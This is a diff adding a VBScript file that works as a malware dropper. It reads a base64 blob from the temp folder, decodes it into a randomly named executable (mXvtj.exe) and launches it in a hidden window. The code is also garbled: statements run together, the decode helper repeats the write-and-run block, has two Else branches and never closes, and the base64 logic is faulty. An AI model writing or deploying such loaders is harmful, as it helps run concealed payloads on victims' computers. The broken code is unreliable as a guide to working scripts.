@@ -1,0 +1,47 @@
+
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set file = fs.GetFile("%TEMP%\FMEGz.b64")
+If file.Size Then
+    Set fd = fs.OpenTextFile("%TEMP%\FMEGz.b64", 1)
+    data = fd.ReadAll
+    data = Replace(data, vbCrLf, "")
+    data = base64_decode(data)
+    fd.CloseSet ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\mXvtj.exe", 2, True)
+    ofs.Write data
+    ofs.close
+    Set shell = CreateObject("Wscript.Shell")
+    shell.run "%TEMP%\mXvtj.exe", 0, false
+Else
+    Wscript.Echo "The file is empty."
+End If
+
+Function base64_decode(byVal strIn)
+    Dim w1, w2, w3, w4, n, strOut
+    For n = 1 To Len(strIn) Step 4
+        w1 = mimedecode(Mid(strIn, n, 1))
+        w2 = mimedecode(Mid(strIn, n + 1, 1))
+        w3 = mimedecode(Mid(strIn, n + 2, 1))
+        w4 = mimedecode(Mid(strIn, n + 3, 1))
+        If Not w2 Then _
+            strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255))
+        If  Not w3 Then _
+            strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255))
+        If Not w4 Then _
+            strOut = strOut + Chr(((w3 * 64 + w4) And 255))
+        Next
+        base64_decode = strOut
+End Function
+
+Function mimedecode(byVal strIn)
+    Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    If Len(strIn) = 0 Then
+        mimedecode = -1 : Exit Function
+    Else
+        Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\mXvtj.exe", 2, True)
+        ofs.Write data
+        ofs.close
+        Set shell = CreateObject("Wscript.Shell")
+        shell.run "%TEMP%\mXvtj.exe", 0, false
+    Else
+        Wscript.Echo "The file is empty."
+    End If
